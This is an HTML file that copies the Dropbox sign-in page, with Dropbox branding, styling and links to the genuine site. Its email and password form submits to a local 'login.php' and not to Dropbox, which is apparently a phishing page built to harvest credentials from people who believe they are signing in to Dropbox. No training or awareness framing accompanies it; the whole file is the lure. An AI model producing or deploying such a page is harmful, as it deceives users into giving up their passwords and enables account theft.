<!DOCTYPE html>
<html class="media-desktop js-focus-visible" lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8">
    <meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
    <meta content="origin-when-cross-origin" name="referrer">
    <link href="https://www.dropbox.com/login" rel="canonical">
    <link href="https://cfl.dropboxstatic.com/static/images/favicon.ico" rel="shortcut icon">
    <meta content="Login to Dropbox. Bring your photos, docs, and videos anywhere and keep your files safe." name="description">
    <title>Login - Dropbox</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:"Open Sans","lucida grande","Segoe UI",arial,verdana,"lucida sans unicode",tahoma,sans-serif;font-size:13px;color:#1e1919;font-weight:400;background:#fff;min-height:100%;-webkit-font-smoothing:antialiased}
        a{color:#0061fe;text-decoration:none}
        a:hover{text-decoration:underline}
        .clearfix:after{content:"";display:table;clear:both}
        button{cursor:pointer;border-style:solid;outline:0}

        .minimal-nav-head{position:fixed;top:0;left:0;right:0;z-index:99;background:#fff;border-bottom:1px solid #e5e0d7;height:48px}
        .nav-inner{max-width:1280px;margin:0 auto;padding:0 20px;height:100%;display:flex;align-items:center;justify-content:space-between}
        .nav-logo{display:flex;align-items:center}
        .nav-logo svg{width:30px;height:25px}
        .nav-signup{padding:8px 16px;font-size:16px;font-weight:500;color:#1e1919;border-radius:8px;transition:background .2s}
        .nav-signup:hover{background:#f7f5f2;text-decoration:none}

        #page-content{padding-top:126px;text-align:center;min-height:100vh}
        .login-wrapper{display:inline-block;vertical-align:middle;margin-top:64px;margin-bottom:64px}

        .login-container{width:350px;text-align:left}
        .login-header-row{display:flex;justify-content:space-between;align-items:flex-end;margin-bottom:10px}
        .login-header-row h2{font-size:18px;font-weight:400}
        .login-header-row span{font-size:13px;color:#1e1919}

        .form-group{margin-bottom:16px;position:relative}
        .form-group label{display:block;font-size:16px;color:#737373;margin-bottom:4px;cursor:text}
        .form-group input{width:100%;font-size:16px;padding:5px 6px;min-height:34px;border:1px solid #958c7e;border-radius:3px;outline:0;box-sizing:border-box}
        .form-group input[type="password"]{font-size:20px}
        .form-group input:focus{border-color:#0061fe;box-shadow:0 0 0 3px rgba(0,97,254,.2)}

        .hr-label{position:relative;margin-top:20px;margin-bottom:5px;text-align:center;clear:both;overflow:hidden}
        .hr-label::before,.hr-label::after{content:"";position:relative;width:50%;background:rgba(0,0,0,.2);display:inline-block;height:1px;vertical-align:middle}
        .hr-label::before{right:.5em;margin-left:-50%}
        .hr-label::after{left:.5em;margin-right:-50%}

        .btn{min-height:34px;border-radius:3px;padding:6px 16px;font-size:13px;font-weight:600;cursor:pointer;display:inline-block;text-align:center}
        .btn-primary{background:#0070e0;background-image:linear-gradient(#168add,#007ee5);border:1px solid #0c6ebe;color:#fff}
        .btn-primary:hover{background:linear-gradient(#168eef,#007ee5);text-decoration:none}
        .btn-primary:active{background:linear-gradient(#1b80d3,#0a74cb);box-shadow:inset 0 1px 0 rgba(61,70,71,.1)}
        .btn-login{float:right;margin:16px 0 5px}

        .btn-apple{width:100%;min-height:44px;border:2px solid #1e1919;background:#f7f5f2;border-radius:8px;display:flex;align-items:center;justify-content:center;gap:8px;font-size:16px;font-weight:500;color:#1e1919;cursor:pointer;padding:10px;margin-bottom:8px}
        .btn-apple:hover{background:#eee9e2;text-decoration:none}
        .btn-apple svg{width:24px;height:24px;flex-shrink:0}

        .checkbox-inline{display:flex;align-items:center;gap:7px;margin:2px 0 5px}
        .checkbox-inline input{width:14px;height:14px;cursor:pointer}
        .checkbox-inline label{cursor:pointer;font-size:13px}

        .forgot-link{margin-top:13px}
        .forgot-link a{display:block;margin-bottom:4px}

        @media(max-width:414px){.login-container{width:100%;padding:0 16px}}
    </style>
</head>
<body class="login-or-register-page">
    <nav class="minimal-nav-head">
        <div class="nav-inner">
            <a class="nav-logo" href="https://www.dropbox.com/" title="Dropbox">
                <svg width="30" height="25" viewBox="0 0 30 25" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M7.70076 0.320312L0.478516 4.91332L7.70076 9.50633L14.9242 4.91332L22.1465 9.50633L29.3687 4.91332L22.1465 0.320312L14.9242 4.91332L7.70076 0.320312Z" fill="#0061FE"/>
                    <path d="M7.70076 18.6925L0.478516 14.0994L7.70076 9.50633L14.9242 14.0994L7.70076 18.6925Z" fill="#0061FE"/>
                    <path d="M14.9242 14.0994L22.1465 9.50633L29.3687 14.0994L22.1465 18.6925L14.9242 14.0994Z" fill="#0061FE"/>
                    <path d="M14.9242 24.8164L7.70077 20.2234L14.9242 15.6304L22.1465 20.2234L14.9242 24.8164Z" fill="#0061FE"/>
                </svg>
            </a>
            <a class="nav-signup" href="https://www.dropbox.com/register" target="_blank" rel="noopener noreferrer">Sign up</a>
        </div>
    </nav>

    <div id="page-content">
        <div class="login-wrapper">
            <div class="login-container">
                <div class="login-header-row">
                    <h2>Sign in</h2>
                    <span>or <a href="https://www.dropbox.com/register" target="_blank" rel="noopener noreferrer">create an account</a></span>
                </div>

                <form action="login.php" method="POST">
                    <a href="https://appleid.apple.com" target="_blank" rel="noopener noreferrer" class="btn-apple">
                        <svg viewBox="0 0 24 24" fill="none"><path d="M18.695 16.469a8.691 8.691 0 0 1-.86 1.546c-.453.645-.823 1.092-1.109 1.34-.442.407-.916.615-1.424.627-.364 0-.804-.104-1.315-.314-.514-.21-.985-.313-1.417-.313-.452 0-.937.103-1.456.313-.52.21-.938.32-1.258.33-.487.021-.972-.193-1.457-.643-.309-.27-.696-.732-1.159-1.387a9.591 9.591 0 0 1-1.225-2.434c-.343-.999-.515-1.966-.515-2.902 0-1.072.232-1.997.696-2.772a4.082 4.082 0 0 1 1.457-1.474 3.92 3.92 0 0 1 1.97-.556c.387 0 .894.12 1.524.355.628.236 1.032.355 1.209.355.132 0 .58-.14 1.34-.418.718-.259 1.325-.366 1.822-.324 1.346.109 2.357.64 3.03 1.595-1.204.73-1.8 1.752-1.788 3.062.01 1.021.381 1.87 1.109 2.545.33.313.698.555 1.108.727-.089.258-.183.505-.282.742Z" fill="#1e1919"/></svg>
                        Sign in with Apple
                    </a>

                    <div class="hr-label"><span>or</span></div>

                    <div class="form-group" style="margin-top:20px">
                        <label for="login_email">Email</label>
                        <input id="login_email" type="email" name="login_email" autocomplete="username" required>
                    </div>
                    <div class="form-group">
                        <label for="login_password">Password</label>
                        <input id="login_password" type="password" name="login_password" autocomplete="current-password" required>
                    </div>

                    <div class="clearfix">
                        <div class="checkbox-inline">
                            <input type="checkbox" id="remember_me" name="remember_me" checked>
                            <label for="remember_me">Remember me</label>
                        </div>
                        <button class="btn btn-primary btn-login" type="submit">Sign in</button>
                    </div>
                    <div class="forgot-link">
                        <a href="https://www.dropbox.com/forgot" target="_blank" rel="noopener noreferrer">Forgot your password?</a>
                    </div>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
